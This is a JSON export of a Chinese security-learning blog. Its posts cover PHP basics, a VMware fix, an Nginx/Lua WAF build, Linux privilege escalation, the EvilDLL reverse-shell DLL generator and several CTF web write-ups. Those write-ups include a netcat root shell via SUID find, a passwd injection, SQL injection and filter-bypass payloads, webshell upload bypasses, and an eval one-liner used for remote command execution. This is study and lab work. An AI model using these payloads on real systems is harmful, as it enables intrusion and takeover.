splicies就好了。我也试了一下结果就导致没有证书了，根本无法访问，还在vmware证书确实也没有了，但是也访问不了。\n\n对此，我懵逼了！！！\n我折腾了好久，才发现出现这种情况是因为开启了vmshare功能，也就是共享虚拟机功能。所以要解决这个问题很简单，直接打开vmware，选择edit-&gt;Preferences-&gt;Shared VMs，在里面关闭share功能就好了。可以看到访问不了网页是因为443端口被代理了。\n\n这样操作之后重启浏览器，你就会发现恢复正常了。\n\nnice了，恢复正常，就是最近github.io又被ban了，需要翻才能用了。\n上面都是我的实测，希望可以帮到需要的盆友们。\n","slug":"vmware证书劫持网页解决方案","date":"2020-08-30T05:22:01.000Z","categories_index":"资源教程","tags_index":"vmware","author_index":"A1andNS"},{"id":"6acc9b76870671389b16a7816bf2f860","title":"一些Linux提权姿势","content":"今天看到了一篇Linux提权姿势的文章，顺着大佬的思路，来学习一下。\n信息收集1、内核、操作系统和设备硬件信息#打印所有可用的系统信息，通常会显示系统主机名、系统内核版本，系统位数和编译时间等信息，基本上就是下面的集合\nuname -a \n#打印内核版本\nuname -r\n#打印系统主机名\nuname -n 或 hostname\n#查看系统内核架构\nuname -m\n#内核信息，甚至比uname -a更加详细\ncat /proc/version\n#分发信息,感觉release记录的信息更全\ncat /etc/*-release 或 cat /etc/issue\n#CPU信息\ncat /proc/cpuinfo\n\n运行效果如下图了：\n\n用户和群组#列出系统上所有用户，还挺多的\ncat /etc/passwd\n#列出系统上所有的组，不查不知道，还挺多的\ncat /etc/group\n#列出所有的超级用户账户\ngrep -v -E \"^# \" /etc/passwd | awk -F: '$3 == 0&#123; print $1&#125;'\n#查看当前用户\nwhoami\n#谁目前登陆了，行为是什么\nw\n#最后登陆的用户的列表\nlast\n#所有用户上次登录的信息\nlastlog\n#有关指定用户上次登录的信息\nlastlog -u %username%\n#以前登陆用户的信息,与lastlog类似\nlastlog | grep -v \"Never\"\n\n主要常用的可能就是whoami，看看自己的权限是什么，或者cat /etc/passwd来看看用户有哪些，cat  /etc/group是一样的。\n用户和权限信息#查询当前用户的信息,可以看到UID、GID等信息\nid\n#谁被允许以root身份执行,访问此文件需要为root用户才行\ncat /etc/sudoers\n#当前用户可以以root身份执行操作\nsudo -l\n\n环境信息#显示环境变量\nenv \n#现实环境变量\nset\n#路径信息\necho %PATH\n#显示当前用户的历史命令记录\nhistory \n#输出工作目录，经常被用来查看当前所在目录位置\npwd \n#显示默认系统变量\ncat /etc/profile \n#显示可用的shell，我这有dash和bash\ncat /etc/shells \n\nBash(GNU Bourne-Again Shell)是许多Linux平台的内定Shell,在GNU/Linux系统中bin/sh本事bash的符号链接，但因为bash过于复杂，有人把bash从NetBSD移植Linux并更名为dash (Debian Almquist Shell)，并建议把/bin/sh指向他，以此获得更快的脚本执行速度。因为Deepin操作系统是基于Debian的，所以Deepin的bin/sh也是指向dash的。\n\nSUIDSUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权就可以运行root用户拥有的SUID文件了，那么我们运行这个文件就需要获得root用户的身份了。\n目前可以用来SUID提权的命令有：\nnmap、vim、find、bash、more、less、nano、cp\n#以下是查找SUID可执行性文件命令\nfind / -perm -u=s -type f 2>/dev/null\n\n/表示从文件系统的顶部（根）开始并找到每个目录\n-perm 表示搜索随后的权限\n-u = s表示查找root用户拥有的文件\n-type表示我们正在寻找的文件类型\nf 表示常规文件，而不是目录或特殊文件\n2 表示该进程的第二个文件描述符，即stderr（标准错误）\n> 表示重定向\n/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。\n除此之外还有如下命令，不同系统适用于不同命令\nfind / -user root -perm -4000-print2>/dev/null\nfind / -user root -perm -4000-exec ls -ldb &#123;&#125; ;\n\n文件描述符小拓展：\n\n\n\n\n\n\n\n\n\nSTDIN 的文件描述符为 0\nSTDOUT 的文件描述符为 1\nSTDERR 的文件描述符为 2\n实际尝试假如我获取到了一台服务器权限的shell\n先看看当前用户信息：\n查看具有root权限的SUID文件：\n创建一个文件来测试find命令时候可以以root权限运行touch test\nfind test -exec whoami \\;\n#如果回显为root说明是以root权限运行的\n\n大部分的linux操作系统都自带netcat，因此可以使用netcat将权限提升至rootfind test -exec netcat -lvp 9999 -e /bin/sh \\;\n\n它就反弹回来一个root权限了。\n\n利用root无密码执行一个命令或者脚本可以以root身份运行，若在无密码情况下去执行，我们可以通过修改脚本内容或直接执行这个命令，利用命令来进行一些操作，来进行提取。\n首先查看当前用户权限id命令和whoami命令\n探查哪些命令sudo不用密码sudo -l，假如有一个teehee命令不需要sudo密码，那么先看看teehee命令的帮助文档，了解一下相关命令的使用规则。\n写入一个账号test到passwd中：\necho \"test::0::0:::/bin/bash\" | sudo teehee -a /etc/passwd\nsu test\nwhoami  #查询一下是否成功得到root权限\n\n利用内核漏洞提权如果脏牛提权无法成功，可以查看其他版本的内核漏洞，基本上就是用kali里的searchsploit可以帮助我们查看各种linux发新版本漏洞。\n\n看一下脚本内容。\n\n需要下载exp到本地，运行提权。\n脏牛提权漏洞范围：大于2.6.22版本 (2007年发行，到2016年10月18日修复)\n危害：低权限的用户可利用这一漏洞在本地进行提权\n原理：linux内核的子系统在处理写入时复制至产生了竞争条件，恶意用户可利用此漏洞来获取高权限，对只读内存映射进行访问。竞争条件，指的是任务执行顺序异常，可导致应用奔溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获取到root权限。\nEXP下载https://github.com/FireFart/dirtycow\n具体做法单独写一篇博客。\n参考文章[1] https://www.jianshu.com/p/762d4cccee7e\n[2] https://mp.weixin.qq.com/s/23bQ9nhavXGOvOknEc-BAA\n","slug":"一些Linux提权姿势","date":"2020-08-28T14:38:22.000Z","categories_index":"权限提升","tags_index":"Linux,提权","author_index":"A1andNS"},{"id":"baa430cea36dc29f733210bfed21d4b2","title":"PHP学习(三)","content":"PHP EOF(headoc)这是一种在命令行shell和程序语言perl、PHP等里定义一个字符串的方法\n关键点\n\n必须后接分号，否则编译通不过。\nEOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。\n   结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。\n开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。\n当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。\n\n以&lt;&lt;&lt;EOF开始标记开始，以EOF结束标记结束，结束标记必须单独一行，而且顶格，结尾;\n","slug":"PHP学习-三","date":"2020-08-26T08:29:50.000Z","categories_index":"PHP","tags_index":"PHP","author_index":"A1andNS"},{"id":"7accb6e3c1142903ce150ec097962cd3","title":"PHP学习（二）","content":"安装和配置PHP安装PHP语言PHP底层是C语言实现\n1、官网下载PHP安装包\n2、解压放到服务目录下就好了\nPHP安装目录\n解析PHP的命令：php -f xxxx.php\nApache加载PHP模块1、Apache主配置文件中加载对应的PHP提供的模块LoadModule php_5_module PHP所提供的模块链接路径，我这PHPstudy的PHP目录下是没有相关模块文件的，所以就没有去试了，但是如果要试的话，最好下载PHP的THREAD SAFE版本比较好。\n在httpd.conf文件中加入LoadModule  php7_module ‘E:/phpstudy/extends/php/php7apache2_2.dll’即可，路径自己找好就好了。\n2、Apache分配工作给PHP模块如果还是PHP代码就交给PHP处理，.php文件就被交给PHP处理。在主配置文件中加入AddType application/x-httpd-php .php表示以.php结尾的文件给php处理。\n3、php配置文件加载到Apache配置文件中在主配置文件中添加PHPIniDir &#39;E:/PHPStudy/php7&#39;\nPHP语法PHP基础语法PHP脚本在服务器上执行，然后以HTML结果发送于浏览器。\n这是PHP的基础语法，以&lt;?php开头，以?&gt;结尾，默认后缀.php。PHP通常与HTML结合使用。\n&lt;?php\n\n//PHP代码\n\n?>\n\n&lt;!--以下为简单写的PHP+HTML页面,并且写了一个system函数，但是存在安全隐患--&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;this is a test page&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    &lt;h1&gt;this is the first page&lt;&#x2F;h1&gt;\n    &lt;?php\n    echo &quot;Hello World!!!&quot;;\n    $a &#x3D; $_GET[&#39;a&#39;];\n    echo system($a);\n    ?&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\nPHP的每一条代码都必须用;结尾。这个和C语言一样，分号是一种分隔符，用于把指令集区分开。这个作用在Linux和Windows系统command line下是一样的。\nPHP有两种输出文本的基本指令：echo和print，基本语言也接近于这两个。\nPHP的注释每个语言都有注释但也不同，Python是#和&#39;&#39;&#39;,C是//和/**/，而PHP和C是一样的，单行用//，多行用/**/，这个倒是很容易就习惯，学了C的话。\nPHP变量不同语言对变量的规则略有不同，但是大体相同。\n\n变量以 $ 符号开始，后面跟着变量的名称\n变量名必须以字母或者下划线字符开始\n变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）\n变量名不能包含空格\n变量名是区分大小写的（$y 和 $Y 是两个不同的变量）\n\n这里需要注意一点：PHP经常和HTML结合编写，但是HTML对大小写不敏感，PHP是对大小写敏感的。\n创建PHP变量PHP变量没有声明语句，这和Python有点像，直接在第一次赋值是被创建。直接跳过，和Python写法一样，就是要加个;。\nPHP是一门弱类型语言这就是为什么，PHP不需要声明变量，而是和Python一样直接赋值就ok了。而强类型编程语言中，我们必须在使用变量前声明变量类型和名称，例如C和JAVA。\nPHP变量作用域变量的作用域是脚本中变量可被引用/使用的部分，就是一个可以调用的范围限制。\nPHP 有四种不同的变量作用域：\n\nlocal\nglobal\nstatic\nparameter\n\nlocal 和 global作用域PHP函数内声明的变量只能在函数内部访问，是局部变量，如果要在函数中使用全局变量就要用到global来实现了。函数外定义的变量即为全局变量了。这个和其他语言也是一样的，全局和局部的关系，学过C也都知道了。\n&lt;?php\n$x&#x3D;5; &#x2F;&#x2F; 全局变量\n\nfunction myTest()\n&#123;\n    $y&#x3D;10; &#x2F;&#x2F; 局部变量\n    global $x; &#x2F;&#x2F;添加这一句才能在函数中成功调用全局变量$x\n    echo &quot;变量 x 为: $x&quot;;\n    echo &quot;&lt;br&gt;&quot;;\n    echo &quot;变量 y 为: $y&quot;;\n&#125;\n?&gt;\n\nPHP将所有全局变量存储在一个叫$GLOBALS[index]的数组中。index保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;this is a test page&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    &lt;h1&gt;this is the first page&lt;&#x2F;h1&gt;\n    &lt;?php\n    $x&#x3D;5; &#x2F;&#x2F; 全局变量\n\n    function myTest()\n    &#123;\n        $y&#x3D;10; &#x2F;&#x2F; 局部变量\n        echo &quot;&lt;p&gt;测试函数内变量:&lt;p&gt;&quot;;\n        echo $GLOBALS[&#39;x&#39;]+$y;\n    &#125;\n\n    myTest();\n\n    echo &quot;&lt;p&gt;测试函数外变量:&lt;p&gt;&quot;;\n    echo &quot;变量 x 为: $x + $y&quot;;\n    ?&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n$GLOBAL[index]数组的这种写法是可以成功在函数中调用全局变量的。\nstatic作用域在PHP中当函数完成时，他的局部变量会被删除，如果希望某个局部变量不会自动杯删除，可以施一公static关键字来声明他，在第一次赋值（声明）时声明static关键字。之后每次调用此函数，函数中的static变量都会保留上一次被调用时的值。需要注意：变量依旧还是局部变量，没有发生本质改变。\n参数作用域参数作用域就是平时定义函数的时候，会有传参数进入函数的情况，这时候就是参数作用域起作用了,参数作为函数声明的一部分。\n大多数语言都是这样的，全局和局部是独立的两个部分，即使在函数中存在和全局变量名一样的局部变量，函数也是以局部域来看的，即以函数内的局部变量为准。除非用global修饰或者使用了$GLOBALS[]。\nPHP echo and printPHP的两个基本输出，在很多地方都可以看到，一个是echo，一个是print。他们两个肯定是有些区别的，echo可以输出一个或多个字符串，print只允许输出一个字符串，返回值总为1。\necho输出速度比print快，echo没有返回值，print有返回值1\nPHP echoecho是一个语言结构，echo使用的时候可以带()也可以不带。即echo或echo()。\n前面我写了一个echo &quot;这是函数第&quot;.&quot;$time&quot;.&quot;次执行&quot;;，搞清楚echo的用法后，其实可以直接echo &quot;这是函数第 $time 次执行&quot;;这样。但是问题是什么呢，这个在输出的时候会在次字前面添加空格，如果$time与次字连在一次会有语法问题。所以最后输出是这是函数第 1 次执行，而原来拼接的效果是这是函数第1次执行。\nPHP printprint同样是一个语言结构，可以使用括号，也可以不使用括号：print或print()。\n用法和echo一样的，pic就不多说了。\n","slug":"PHP学习（二）","date":"2020-08-09T15:04:30.000Z","categories_index":"PHP","tags_index":"PHP","author_index":"A1andNS"},{"id":"bd839c268cb45c5c23698cd90b30a351","title":"Lua+Nginx搭建WAF","content":"搭建报告一、  实验内容（1） 实现一个Nginx+Lua的防火墙\n（2） 独立搭建一个完整的环境\n（3） 进行两种攻击sql攻击和xss\n（4） 拦截的效果展示\n（5） 提交报告\n二、  实验环境（1） Windows10主机、CentOS7虚拟机\n（2） Nginx、Lua、LuaJIT、ngx_devel_kit-0.3.1、lua-nginx-module-0.10.15\n三、  环境搭建Nginx:\n\n\n\n\n\n\n\n\n\n–module:\nngx_devel_kit-0.3.1、lua-nginx-module-0.10.15\n\nLua:\n\nLuaJIT:\n\nWAF:\n\n\n四、  实验步骤1、   下载、编译、安装nginx第一步是要安装好需要的编译环境。\nyum install gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel -y\n\n接着就下载nginx的tar.gz包，在包所在目录使用tar命令解压包，进入nginx目录中，执行编译操作（注意应该在root权限下执行./configure操作。然后编译安装（make &amp;&amp; make install）。\n2、   配置systemctl因为CentOS7开始就使用systemctl了，所以用它来添加自定义系统服务。\nVim &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;nginx.service,编辑内容为：\n\n[Unit]\n\nDescription&#x3D;nginx - high performance web server\n\nDocumentation&#x3D;http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;\n\nAfter&#x3D;network-online.target remote-fs.target nss-lookup.target\n\nWants&#x3D;network-online.target\n\n \n\n[Service]\n\nType&#x3D;forking\n\nPIDFile&#x3D;&#x2F;var&#x2F;run&#x2F;nginx.pid\n\nExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf\n\nExecReload&#x3D;&#x2F;bin&#x2F;kill -s HUP $MAINPID\n\nExecStop&#x3D;&#x2F;bin&#x2F;kill -s TERM $MAINPID\n\n \n\n[Install]\n\nWantedBy&#x3D;multi-user.target\n\nVim &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;nginx-debug.service,编辑为：\n\n[Unit]\n\nDescription&#x3D;nginx - high performance web server\n\nDocumentation&#x3D;http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;\n\nAfter&#x3D;network-online.target remote-fs.target nss-lookup.target\n\nWants&#x3D;network-online.target\n\n \n\n[Service]\n\nType&#x3D;forking\n\nPIDFile&#x3D;&#x2F;var&#x2F;run&#x2F;nginx.pid\n\nExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx-debug -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf\n\nExecReload&#x3D;&#x2F;bin&#x2F;kill -s HUP $MAINPID\n\nExecStop&#x3D;&#x2F;bin&#x2F;kill -s TERM $MAINPID\n\n \n\n[Install]\n\nWantedBy&#x3D;multi-user.target\n\n编辑结束后重载一下systemctl：systemctl daemon-reload\n3、   放行端口firewall-cmd –-zone=public –-add-port=80/tcp –permanent来放行80端口，这样才能正常访问web。\n接着使用firewall-cmd –-reload，重载防火墙，让规则生效。\n4、   设置开机启动systemctl enable nginx这样就可以开机自启nginx服务了。\nuseradd -s /sbin/nologin -M nginx这一步很重要，没做后面可能会遇到报错情况。\nsystemctl start nginx这样就启动了nginx服务。\n想要确认服务启动，可以通过ps -aux | grep nginx来查询进程，进程中有我们要的nginx就ok了。\n5、   下载、编译、安装Lua模块Yum install lua lua-devel -y首先安装所需要的库。\n接着就去下载、编译、安装LuaJIT：\nmake install PREFIX=/usr/local/LuaJIT  //编译安装\n为它添加环境变量：\nexport LUAJIT_LIB=/usr/local/LuaJIT/lib\nexport LUAJIT_INC=/usr/local/LuaJIT/include/luajit-2.0\n加载lua库岛ld.so.conf文件里：\necho &quot;/usr/local/LuaJIT/lib&quot; &gt;&gt; /etc/ld.so.conf\n确认添加进去后执行ldconfig，加载入缓存。\n下载ngx_devel_kit 和 lua-nginx-module``模块，在nginx解压文件中重新编译安装一下。\n在root模式下，向配置命令中加入--add-module=../ngx_devel_kit-0.3.1 --add-module=../lua-nginx-module-0.10.15既可以添加相关模块。之后就是一样的make &amp;&amp; make install。稍微验证一下Lua模块是否工作就可以了。\n6、   防火墙搭建使用了github仓库里的一个开源ngx_lua_waf项目。项目地址：https://github.com/loveshell/ngx_lua_waf使用git克隆到本地，通过mv命令移到nginx的waf目录下。下面就开始对waf进行必要配置，配置config.lua文件，开启CCDeny等选项，设置日志保存路径。在nginx.config文件里配置http下内容，添加\nlua_package_path &quot;&#x2F;etc&#x2F;nginx&#x2F;waf&#x2F;?.lua&quot;;\nlua_shared_dict limit 10m;\ninit_by_lua_file &#x2F;etc&#x2F;nginx&#x2F;waf&#x2F;init.lua;\naccess_by_lua_file &#x2F;etc&#x2F;nginx&#x2F;waf&#x2F;waf.lua;\n\n配置语法检查nginx -t -c /etc/nginx/nginx.conf然后重载配置nginx -s reload -c /etc/nginx/nginx.conf但是有时候并不会生效，还需要systemctl restart nginx才行。配置防火墙过滤规则，到wafconf目录下配置相应的args、url、post、whitelist、user-agent等文件中添加规则即可。\n配置语法检查nginx -t -c /etc/nginx/nginx.conf然后重载配置nginx -s reload -c /etc/nginx/nginx.conf但是有时候并不会生效，还需要systemctl restart nginx才行。配置防火墙过滤规则，到wafconf目录下配置相应的args、url、post、whitelist、user-agent等文件中添加规则即可。\n五、  拦截效果（1） SQL注入1)浏览器\n\n\n2）服务器log\n\n\n（2） XSS1）浏览器：\n\n\n2）服务器log：\n\n参考链接：https://www.cnblogs.com/dotnetcrazy/p/11306202.html#_map16\n","slug":"Lua-Nginx搭建WAF","date":"2020-08-08T11:06:40.000Z","categories_index":"蓝队","tags_index":"蓝队","author_index":"A1andNS"},{"id":"a391b63f847545ca1acc39698f975b5f","title":"PHP学习（一）","content":"先学习的pyhton，PHP落下了，虽然大体上看得懂，还是觉得不太稳，所以整体学习一下。\n什么是PHP？\nPHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。\nPHP 脚本在服务器上执行。\nPHP 可免费下载使用。\n\nPHP的优势\nPHP可以在不同的平台上运行（Windows、Linux、Unix、Mac OS X等）\nPHP与常用的服务器相兼容（Apache、IIS等）\nPHP广泛支持数据库\n\n静态网站特点1、网页内容一经发布到网站服务器上，无论是否有用户访问，每个静态网页的内容都是保存在网站服务器上的，也就是说，静态网页的每个网页都是独立的文件。\n2、静态网页的内容相对稳定，因此容易被搜索引擎检索。\n3、静态网页没有数据库的支持，在网站制作和维护方面工作量较大，因此当网站信息量很大时完全依靠静态网页制作方式分困难。\n4、静态网页交互性差，功能受限了。\n动态网站特点\n交互性：网页会根据用户的要求和选择而动态改变和响应，动态网站时潮流，现在大多数网站都时动态的了。\n自动更新：即无须手动更新HTML文档，便会制动生成新页面，可以大幅减少工作量。\n因时因人而变，即动态了，不同时间、不同用户访问同一网页时会出现不同的结果。\n\n静态网页和动态网页时先对应的，网页URL后缀不是.htm、.html、.shtml、.xml等静态网页的参见形式，而是以.asp、.php、.jsp、.perl、.cgi等后缀。动态网页中有一个标志性的符号，那就是?\nApache服务器Apache安装httpd为Apache服务器服务名，需要到Apache官网下载Apache。我一般可能直接就PHPstudy集成环境了。单独安装也是可以的。\n1、安装第一步\n设置域名和服务名为localhost就OK了。管理员邮件地址就直接&#x61;&#100;&#109;&#x69;&#110;&#x40;&#x61;&#112;&#97;&#x63;&#x68;&#x65;&#46;&#99;&#x6f;&#x6d;就OK了。\n\n第一种for all users适用于对外开放web服务，使用80端口。\n第二种only for the current user使用于个人本机开发，不允许外部访问，使用8080端口。\n2、选择安装模式为自定义模式，如果选择典型，则安装时会自动安装他认为需要的组件，不利于我们自己调控。\n3、选择一个合适的位置安装apache服务。\nApache目录结构\n其中的bin和cgi-bin目录为Windows下的可执行文件。conf目录下为配置文件。htdocs目录为Apache默认的主机地址。modules目录为Apache模块，Apache的所有功能都是模块化的。\nmodules目录下都是.so文件\n\nhttpd.conf 为apache主配置文件，extra目录下还有额外的配置文件。\n\nhttpd.exe为主程序\n服务器进程：运行后才能工作。\n\n用来查看Apache具有那些功能以及配置文件是否出错：httpd或httpd.exe\n2.1 httpd.exe -M查看使用的模块。\n\n\n\n\n\n\n\n\n\n\n\n\nstatic为静态加载：Apache启动就加载好了，可以直接使用。\nshared为动态加载：在使用到的时候才会加载。\n​    2.2 验证配置文件是否有效：httpd -t ,t就是test的含义。\n\nsyntax ok就是表示通过验证，可以正常使用了。\n配置默认站点1、让Apache确定服务器上访问的位置：网站文件夹所在。\nhttpd.conf：DocumentRoot\n\n以我的PHPstudy为例，这个就是网站根目录的地址所在。\n2、给文件夹取一个别名，方便用户访问对应的网站。\nhttpd.conf：ServerName\n\n这里可以写端口也可以不写，还有一个listen专门用来写监听端口的。\n凡是涉及Apache配置文件的修改，那么就需要重启Apache才能生效\n3、实现DNS域名解析：通常都是默认修改本地dns文件，也即是hosts文件。\ndrivers下etc目录下的hosts文件，可以直接win+R，输入drivers回车，直接就到drivers目录下了。\n\n此时浏览器localhost即可访问web服务。\n","slug":"PHP学习（一）","date":"2020-08-08T06:28:34.000Z","categories_index":"PHP","tags_index":"PHP","author_index":"A1andNS"},{"id":"2c85fb612c2f99edec9ccbb865c80b1b","title":"恶意DLL生成器","content":"今天在Freebuf上看到了关于一个恶意DLL文件生成器的介绍，就跟着文章了解了一下。记录一下内容。文章链接：https://mp.weixin.qq.com/s/CCKA4jZ6Wk1qcK9500D5mA\n首先就是今天看到的这个工具叫做EvilDLL，根据Freebuf上的介绍，以下为原文：\n\n\n\n\n\n\n\n\n\nEvilDLL是一款专门针对DLL劫持攻击而开发并设计的恶意DLL（反向Shell）生成器。\n然后正好了解一下DLL劫持是什么意思。\n什么时DLL劫持我看了一下，大概的意思就是正常程序在加载DLL文件时，有个优先级问题，首先会在当前程序所在目录下匹配加载DLL，如果没有找到相关的DLL文件才会去Window系统目录中查找，最后才会在环境变量中列出的目录中查找。所以这就给攻击者提供的一个劫持的机会，只要在程序目录下伪造一个同名DLL文件，就可以做到劫持了，因为程序默认先执行了恶意/伪装的DLL文件，然后才会跳转到系统的正在的DLL文件去执行。这就是一个劫持的过程了。\n\n关于功能性的介绍就不多说了，原链接里有。\n下面就按照原链接里的方法，来配置一下环境以满足工具运行要求。\n一、Mingw-w64编译器：\n二、Ngork认证令牌接下来要搞个Ngork认证令牌：访问https://ngrok.com/signup\n注册一个用户，我这里使用注册新用户的方式，没有成功，始终都是验证失败。所以我在此处直接使用我的GitHub账号登录。\n然后到Authentication处拿去令牌\n\n接下来要在ngrok官网下载客户端，然后安装认证令牌。\n./ngrok authtoken &lt;YOUR_AUTHTOKEN>\n\n三、克隆工具到本地这个工具的原本仓库应该是thelinuxchoice/evildll，但是我在git克隆时，发现该仓库已不存在了。不知道到什么原因，于是我在GitHub上重新检索了evilldll工具。找到了如下图中的仓库：https://github.com/CrackerCat/evildll.git\n\n克隆到本地后，就可以试着来运行一下了。\n\n","slug":"恶意DLL生成器","date":"2020-08-02T14:48:26.000Z","categories_index":"网络安全","tags_index":"网络安全","author_index":"A1andNS"},{"id":"64631c5ddb0aa3cce868e64df4ac6772","title":"第五空间WEB之hate-php","content":"hate-php\n\n\n\n\n\n\n\n\n复现平台：CTFHUB\n题目来源：“第五空间”智能安全大赛WEB题\n题目上来直接给源码：\n&lt;?php\nerror_reporting(0);\nif(!isset($_GET['code']))&#123;\n    highlight_file(__FILE__);\n&#125;else&#123;\n    $code = $_GET['code'];\n    if (preg_match('/(f|l|a|g|\\.|p|h|\\/|;|\\\"|\\'|\\`|\\||\\[|\\]|\\_|=)/i',$code)) &#123; \n        die('You are too good for me'); \n    &#125;\n    $blacklist = get_defined_functions()['internal'];\n    foreach ($blacklist as $blackitem) &#123; \n        if (preg_match ('/' . $blackitem . '/im', $code)) &#123; \n            die('You deserve better'); \n        &#125; \n    &#125;\n    assert($code);\n&#125;\n\n这里可以看到题目对_GET内容进行了过滤，flag、php、[]、”” 、’’之类的都被过滤了，但是发现没有过滤()和~，所以可以用取反的方式来绕过过滤。\n\n而且注意到PHP版本为7.4.5，PHP&gt;7.1 时assert被定义为一种语言构造器。所以可以使用(phpinfo)()来执行phpinfo()函数。\n试一下看看phpinfo能不能成功，写一个小脚本，拿到一个取反的url编码的phpinfo，然后构造payload。\n&lt;?php\n$a = \"phpinfo\";\necho urlencode(~$a);\n>\n//payload:?code=(~%8F%97%8F%96%91%99%90)()\n\n\n居然没有回显，这个有点晕了。试试别的。\n好像都没有回显，不知道是不是环境问题。。\n没有复现成功。\n","slug":"第五空间WEB之hate-php","date":"2020-06-28T04:15:47.000Z","categories_index":"CTF","tags_index":"CTF,WEB","author_index":"A1andNS"},{"id":"95413dc0d7a5fa9cf97869672d0df757","title":"CTFHub技能树web完结","content":"XSS之反射性用了一个XSS平台叫xss8.cc\n\n\ncookie : flag=ctfhub{c6deb9f1323dc3d8ed565bcd6e5382e91aee9c5b}\nSQL-过滤空格这个最近新更新的技能树内容，空格被过滤了，要想办法来绕过啊。\n出现空格就是hack\n\n+是不能用了，用了一样hack。那么试着用/**/来代替空格试一下。发现是可以绕过限制的，正常显示了。那么就常规套路了。\n1/**/order/**/by/**/2\n#确定为列数为2\n-1/**/union/**/select/**/1,2\n#确认显示位为data处\n-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()\n读出表名有news,mknmyejbdf\n-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='mknmyejbdf'\n读出列明有whhjvlxevw\n-1/**/union/**/select/**/1,group_concat(whhjvlxevw)/**/from/**/mknmyejbdf\n读出flag\nctfhub&#123;7e307d32bae075ed6b54181c83201c397b38a7ff&#125;\n\n文件上传-无验证没什么好说的，直接上传php木马，蚁剑连一下就好了。\n\n在html文件夹下拿到flag\nAddType application&#x2F;x-httpd-php .jpg\n\n并且把它上传，这样他就会吧.jpg文件来当作php文件来执行了。\n\n这个时候上传后缀改为jpg的webshell就好了。\n\n蚁剑连接拿flag\n\nif (!empty($_POST['submit'])) &#123;\n    $name = basename($_FILES['file']['name']);\n    $info = pathinfo($name);\n    $ext = $info['extension'];\n    $whitelist = array(\"jpg\", \"png\", \"gif\");\n    if (in_array($ext, $whitelist)) &#123;\n        $des = $_GET['road'] . \"/\" . rand(10, 99) . date(\"YmdHis\") . \".\" . $ext;\n        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) &#123;\n            echo \"&lt;script>alert('上传成功')&lt;/script>\";\n        &#125; else &#123;\n            echo \"&lt;script>alert('上传失败')&lt;/script>\";\n        &#125;\n    &#125; else &#123;\n        echo \"文件类型不匹配\";\n    &#125;\n&#125;\n\n\n\n![image-20200628170709177](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628170722.png)\n\n不会回显地址了，没事/upload/下没有错，和原来一样连一下。\n\n$name = basename($_FILES['file']['name']);\n$blacklist = array(\"php\", \"php5\", \"php4\", \"php3\", \"phtml\", \"pht\", \"jsp\", \"jspa\", \"jspx\", \"jsw\", \"jsv\", \"jspf\", \"jtml\", \"asp\", \"aspx\", \"asa\", \"asax\", \"ascx\", \"ashx\", \"asmx\", \"cer\", \"swf\", \"htaccess\", \"ini\");\n$name = str_ireplace($blacklist, \"\", $name);\n\n因为对后缀的过滤使用了空替换的方式，所以可以通过嵌套后缀的方式来绕过，构造一个`.pphphp`的后缀，系统会吧中间嵌套的php替换为''，那么最后就是`.php`，后缀了。\n\n蚁剑连接我们上传的webshell\n\n&lt;?php\nerror_reporting(0);\nif (isset($_GET['file'])) &#123;\n    if (!strpos($_GET[\"file\"], \"flag\")) &#123;\n        include $_GET[\"file\"];\n    &#125; else &#123;\n        echo \"Hacker!!!\";\n    &#125;\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n&lt;hr>\ni have a &lt;a href=\"shell.txt\">shell&lt;/a>, how to use it ?\n\n开局给源码，strpos函数查找字符串在另一字符串中第一次出现的位置（区分大小写）\n\n访问一下shell.txt吧\n\n&lt;?php eval($_REQUEST['ctfhub']);?>\n\n这是一个一句话shell，这里的$_REQUESR相当于GET+POST。按照代码审计的结果,先GET传参进去\n\n![image-20200628181408429](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628181410.png)\n\n也就是文件包含shell.txt文件，然后POST传参来RCE\n\n//payload：\nctfhub=system(\"ls\");\n//index.php shell.txt\n//在这个目录下没有我们需要的东西，那就只能排查一些主要位置了\nctfhub=system(\"ls /\")；\n//发现了flag\nctfhub=system(\"ls /flag\");\n//发现不是目录\nctfhub=system(\"cat 